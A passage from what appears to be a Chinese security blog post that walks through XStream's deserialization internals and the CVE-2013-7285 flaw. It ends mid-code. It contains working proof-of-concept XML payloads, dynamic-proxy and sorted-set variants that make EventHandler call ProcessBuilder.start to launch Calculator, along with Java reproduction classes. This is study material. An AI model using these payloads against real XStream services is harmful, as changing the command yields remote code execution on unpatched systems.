title="Converter"></a>Converter</h2><p>XStream为Java常见的类型提供了Converter转换器。转换器注册中心是XStream组成的核心部分。</p><p>Converter的职责是提供一种策略，用于将对象图中找到的特定类型的对象转换为XML或将XML转换为对象。</p><p><strong>简单地说，Xstream的思路是通过不同的converter来处理序列化数据中不同类型的数据。</strong></p><p>Converter需要实现3个方法：</p><ul><li>canConvert方法：告诉XStream对象，它能够转换的对象；</li><li>marshal方法：能够将对象转换为XML时候的具体操作；</li><li>unmarshal方法：能够将XML转换为对象时的具体操作；</li></ul><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210727203831632.png" alt="image-20210727203831632" style="zoom:50%;"><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210727203706224.png" alt="image-20210727203706224" style="zoom:50%;"><p><a href="http://x-stream.github.io/converters.html" target="_blank" rel="noopener">http://x-stream.github.io/converters.html</a></p><p>这里告诉了我们针对各种对象XStream做了哪些支持。</p><h1 id="XStream编组-解组具体过程"><a href="#XStream编组-解组具体过程" class="headerlink" title="XStream编组/解组具体过程"></a>XStream编组/解组具体过程</h1><p>XStream : 1.4.6</p><h2 id="fromXML"><a href="#fromXML" class="headerlink" title="fromXML"></a>fromXML</h2><p>xml-&gt;obj 先看如何反序列化出来的：</p><p>第一步：把String转化成StringReader，HierarchicalStreamDriver通过StringReader创建HierarchicalStreamReader，最后调用MarshallingStrategy的unmarshal方法开始解组</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210727193725097.png" alt="image-20210727193725097" style="zoom:50%;"><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210727193927296.png" alt="image-20210727193927296" style="zoom:50%;"><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210727194042572.png" alt="image-20210727194042572" style="zoom:50%;"><p>第二步：进入start方法，开始解析：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">start</span><span class="params">(DataHolder dataHolder)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.dataHolder = dataHolder;</span><br><span class="line">  <span class="comment">//通过Mapper获取对应节点的Class对象</span></span><br><span class="line">    Class type = HierarchicalStreams.readClassType(<span class="keyword">this</span>.reader, <span class="keyword">this</span>.mapper);</span><br><span class="line">  <span class="comment">//Converter根据Class的类型转化成java对象</span></span><br><span class="line">    Object result = <span class="keyword">this</span>.convertAnother((Object)<span class="keyword">null</span>, type);</span><br><span class="line">    Iterator validations = <span class="keyword">this</span>.validationList.iterator();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(validations.hasNext()) &#123;</span><br><span class="line">        Runnable runnable = (Runnable)validations.next();</span><br><span class="line">        runnable.run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看readClassType里面做了什么事情：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Class <span class="title">readClassType</span><span class="params">(HierarchicalStreamReader reader, Mapper mapper)</span> </span>&#123;</span><br><span class="line">    String classAttribute = readClassAttribute(reader, mapper);</span><br><span class="line">    Class type;</span><br><span class="line">    <span class="keyword">if</span> (classAttribute == <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="comment">// 通过节点名获取Mapper中对应的Class对象</span></span><br><span class="line">        type = mapper.realClass(reader.getNodeName());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        type = mapper.realClass(classAttribute);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//返回值type就是obj对应的Class对象</span></span><br><span class="line">    <span class="keyword">return</span> type;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第三步 ： convertAnother 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">convertAnother</span><span class="params">(Object parent, Class type, Converter converter)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//根据mapper获取type类对象的正确类型</span></span><br><span class="line">    type = <span class="keyword">this</span>.mapper.defaultImplementationOf(type);</span><br><span class="line">    <span class="keyword">if</span> (converter == <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="comment">//根据type找到对应的converter</span></span><br><span class="line">        converter = <span class="keyword">this</span>.converterLookup.lookupConverterForType(type);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!converter.canConvert(type)) &#123;</span><br><span class="line">        ConversionException e = <span class="keyword">new</span> ConversionException(<span class="string">"Explicit selected converter cannot handle type"</span>);</span><br><span class="line">        e.add(<span class="string">"item-type"</span>, type.getName());</span><br><span class="line">        e.add(<span class="string">"converter-type"</span>, converter.getClass().getName());</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.convert(parent, type, converter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这里参数parent，converter默认都是null</p><p>如何查找对应的converter？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Converter <span class="title">lookupConverterForType</span><span class="params">(Class type)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//先从缓存集合中查找Converter</span></span><br><span class="line">    Converter cachedConverter = (Converter)<span class="keyword">this</span>.typeToConverterMap.get(type);</span><br><span class="line">    <span class="keyword">if</span> (cachedConverter != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> cachedConverter;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="comment">// 如果缓存中没有，那么就在converter中寻找</span></span><br><span class="line">        Iterator iterator = <span class="keyword">this</span>.converters.iterator();</span><br><span class="line"></span><br><span class="line">        Converter converter;</span><br><span class="line">      <span class="comment">// 遍历converters找到符合的Converter</span></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!iterator.hasNext()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConversionException(<span class="string">"No converter specified for "</span> + type);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            converter = (Converter)iterator.next();</span><br><span class="line">        &#125; <span class="keyword">while</span>(!converter.canConvert(type));</span><br><span class="line"><span class="comment">// 把这次找到的放在缓存集合中</span></span><br><span class="line">        <span class="keyword">this</span>.typeToConverterMap.put(type, converter);</span><br><span class="line">        <span class="keyword">return</span> converter;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在来到<code>return this.convert(parent, type, converter);</code>这句</p><p>会到<code>com.thoughtworks.xstream.core.TreeUnmarshaller#convert</code>这里：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">convert</span><span class="params">(Object parent, Class type, Converter converter)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.types.push(type);</span><br><span class="line">     <span class="comment">// 会进入这里</span></span><br><span class="line">        Object result = converter.unmarshal(<span class="keyword">this</span>.reader, <span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">this</span>.types.popSilently();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ConversionException var6) &#123;</span><br><span class="line">        <span class="keyword">this</span>.addInformationTo(var6, type, converter, parent);</span><br><span class="line">        <span class="keyword">throw</span> var6;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException var7) &#123;</span><br><span class="line">        ConversionException conversionException = <span class="keyword">new</span> ConversionException(var7);</span><br><span class="line">        <span class="keyword">this</span>.addInformationTo(conversionException, type, converter, parent);</span><br><span class="line">        <span class="keyword">throw</span> conversionException;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210727200451023.png" alt="image-20210727200451023"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">unmarshal</span><span class="params">(HierarchicalStreamReader reader, UnmarshallingContext context)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 构造Class类对象的instance实例，field没有赋值，都是默认值</span></span><br><span class="line">    Object result = <span class="keyword">this</span>.instantiateNewInstance(reader, context);</span><br><span class="line">  <span class="comment">// 对result的field赋值</span></span><br><span class="line">    result = <span class="keyword">this</span>.doUnmarshal(result, reader, context);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.serializationMethodInvoker.callReadResolve(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="有趣的Converter"><a href="#有趣的Converter" class="headerlink" title="有趣的Converter"></a>有趣的Converter</h2><p>Xstream在处理实现了Serializable接口和没有实现Serializable接口的类生成的对象时，<strong>方法是不一样</strong>的。</p><p>Xstream的思路是在反序列化时，通过不同的converter来处理不同类型的数据。</p><p>最外层的没有实现Serializable接口的类时用的是ReflectionConverter，该Converter的原理是通过反射获取类对象并通过反射为其每个属性进行赋值。</p><p>如果是处理实现了Serializable接口并且重写了readObject方法的对象时使用的是SerializableConverter，并且readObject方法也会被调用。</p><h1 id="CVE-2013-7285"><a href="#CVE-2013-7285" class="headerlink" title="CVE-2013-7285"></a>CVE-2013-7285</h1><p>影响范围：</p><ul><li>XStream version &lt;= 1.4.6 &amp; XStream version = 1.4.10</li></ul><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><p>经典老番<a href="https://0range228.github.io/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E9%82%A3%E7%82%B9%E4%BA%8B/" target="_blank" rel="noopener">动态代理那些事</a></p><h3 id="EventHandler"><a href="#EventHandler" class="headerlink" title="EventHandler"></a>EventHandler</h3><p>EventHandler也是实现了<code>InvocationHandler</code>接口的类</p><p>EventHandler用来监控接口中的方法被调用后执行EventHandler中成员变量指定的方法。</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210727205609443.png" alt="image-20210727205609443" style="zoom:50%;"><p>注意两个属性：target , action</p><p>看个小例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">HelloService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">goodMorning</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">goodEvening</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloImpl</span> <span class="keyword">implements</span> <span class="title">HelloService</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">goodMorning</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Good Morning!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">goodEvening</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Good Evening!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Tester</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        HelloService hello = <span class="keyword">new</span> HelloImpl();</span><br><span class="line">        EventHandler start = <span class="keyword">new</span> EventHandler(<span class="keyword">new</span> ProcessBuilder(<span class="string">"open"</span>,<span class="string">"/Applications/Calculator.app"</span>), <span class="string">"start"</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">        HelloService o = (HelloService)Proxy.newProxyInstance(hello.getClass().getClassLoader(), hello.getClass().getInterfaces(), start);</span><br><span class="line">        o.goodMorning();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经典老番，计算器弹出：</p><p>跟一下是怎么走的：</p><ol><li>EventHandler.invoke()：</li></ol><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210728162602037.png" alt="image-20210728162602037" style="zoom:50%;"><ol start="2"><li><p>EventHandler.invokeInternal()：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">invokeInternal</span><span class="params">(Object proxy, Method method, Object[] arguments)</span> </span>&#123;</span><br><span class="line">    String methodName = method.getName();</span><br><span class="line">    <span class="keyword">if</span> (method.getDeclaringClass() == Object<span class="class">.<span class="keyword">class</span>)  </span>&#123;</span><br><span class="line">        <span class="comment">// Handle the Object public methods.</span></span><br><span class="line">      <span class="comment">// 这里首先查看被调用的方法是不是hashCode、equals、toString</span></span><br><span class="line">        <span class="keyword">if</span> (methodName.equals(<span class="string">"hashCode"</span>))  &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Integer(System.identityHashCode(proxy));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">"equals"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (proxy == arguments[<span class="number">0</span>] ? Boolean.TRUE : Boolean.FALSE);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">"toString"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> proxy.getClass().getName() + <span class="string">'@'</span> + Integer.toHexString(proxy.hashCode());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (listenerMethodName == <span class="keyword">null</span> || listenerMethodName.equals(methodName)) &#123;</span><br><span class="line">        Class[] argTypes = <span class="keyword">null</span>;</span><br><span class="line">        Object[] newArgs = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (eventPropertyName == <span class="keyword">null</span>) &#123;     <span class="comment">// Nullary method.</span></span><br><span class="line">            newArgs = <span class="keyword">new</span> Object[]&#123;&#125;;</span><br><span class="line">            argTypes = <span class="keyword">new</span> Class&lt;?&gt;[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            Object input = applyGetters(arguments[<span class="number">0</span>], getEventPropertyName());</span><br><span class="line">            newArgs = <span class="keyword">new</span> Object[]&#123;input&#125;;</span><br><span class="line">            argTypes = <span class="keyword">new</span> Class&lt;?&gt;[]&#123;input == <span class="keyword">null</span> ? <span class="keyword">null</span> :</span><br><span class="line">                                   input.getClass()&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">int</span> lastDot = action.lastIndexOf(<span class="string">'.'</span>);</span><br><span class="line">            <span class="keyword">if</span> (lastDot != -<span class="number">1</span>) &#123;</span><br><span class="line">                target = applyGetters(target, action.substring(<span class="number">0</span>, lastDot));</span><br><span class="line">                action = action.substring(lastDot + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            Method targetMethod = Statement.getMethod(</span><br><span class="line">                         target.getClass(), action, argTypes);</span><br><span class="line">            <span class="keyword">if</span> (targetMethod == <span class="keyword">null</span>) &#123;</span><br><span class="line">                targetMethod = Statement.getMethod(target.getClass(),</span><br><span class="line">                         <span class="string">"set"</span> + NameGenerator.capitalize(action), argTypes);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (targetMethod == <span class="keyword">null</span>) &#123;</span><br><span class="line">                String argTypeString = (argTypes.length == <span class="number">0</span>)</span><br><span class="line">                    ? <span class="string">" with no arguments"</span></span><br><span class="line">                    : <span class="string">" with argument "</span> + argTypes[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(</span><br><span class="line">                    <span class="string">"No method called "</span> + action + <span class="string">" on "</span> +</span><br><span class="line">                    target.getClass() + argTypeString);</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="comment">// 在这里通过反射调用方法</span></span><br><span class="line">            <span class="keyword">return</span> MethodUtil.invoke(targetMethod, target, newArgs);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(ex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            Throwable th = ex.getTargetException();</span><br><span class="line">            <span class="keyword">throw</span> (th <span class="keyword">instanceof</span> RuntimeException)</span><br><span class="line">                    ? (RuntimeException) th</span><br><span class="line">                    : <span class="keyword">new</span> RuntimeException(th);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>MethodUtil.invoke(targetMethod, target, newArgs)形成了方法调用：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210728163105680.png" alt="image-20210728163105680" style="zoom:50%;"></li></ol><p>在这个例子里面：</p><p>targetMethod：ProcessBuilder.start()方法  （action参数）</p><p>target：构造好带有恶意命令的ProcessBuilder对象</p><p>在这里被invoke触发了</p><p>targetMethod哪里来的？就是一开始的action参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Method targetMethod = Statement.getMethod(target.getClass(), action, argTypes);</span><br></pre></td></tr></table></figure><p>看看Converter里面如何解析动态代理对象</p><p><strong>DynamicProxyConverter</strong></p><p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210728164911936.png" alt="image-20210728164911936"></p><p>如图，xml对应的标签就是<code>&lt;dynamic-proxy&gt;</code>，这其中：</p><p><code>&lt;interface&gt;</code>标签就是被代理的接口</p><p><code>&lt;handler&gt;</code>标签表示InvocationHandler实例</p><p>按照官网的这个例子：</p><blockquote><p> dynamic-proxy标签在XStream反序列化之后会得到一个动态代理类对象，当访问了该对象的com.foo.Blah或com.foo.Woo这两个接口类中声明的方法时（即interface标签内指定的接口类），就会调用handler标签中的类方法com.foo.MyHandler。</p></blockquote><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><h3 id="基于接口"><a href="#基于接口" class="headerlink" title="基于接口"></a>基于接口</h3><p>这种也是官网钦定的PoC，interfece字段随便选择一个public接口就行：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">interface</span>&gt;</span>com.thoughtworks.xstream.io.HierarchicalStreamReader<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">"java.beans.EventHandler"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>open<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>/Applications/Calculator.app<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br></pre></td></tr></table></figure><p>复现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Interface_Exploit</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line">        FileInputStream payload = XStreamUtils.getPayload(<span class="string">"CVE_2013_7285_Interface"</span>);</span><br><span class="line">        XStream xStream = <span class="keyword">new</span> XStream();</span><br><span class="line">        HierarchicalStreamReader obj = (HierarchicalStreamReader)xStream.fromXML(payload);</span><br><span class="line">        obj.hasMoreChildren();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我为了省事，选的是<code>com.thoughtworks.xstream.io.HierarchicalStreamReader</code>接口+它内部的<code>hasMoreChildren</code>无参方法。</p><p>调试就是上面EventHandler那部分，这种方式结合了动态代理。</p><h3 id="基于SortedSet"><a href="#基于SortedSet" class="headerlink" title="基于SortedSet"></a>基于SortedSet</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>test<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">"java.beans.EventHandler"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>open<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>/Applications/Calculator.app<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><p>复现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SortedSet_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span 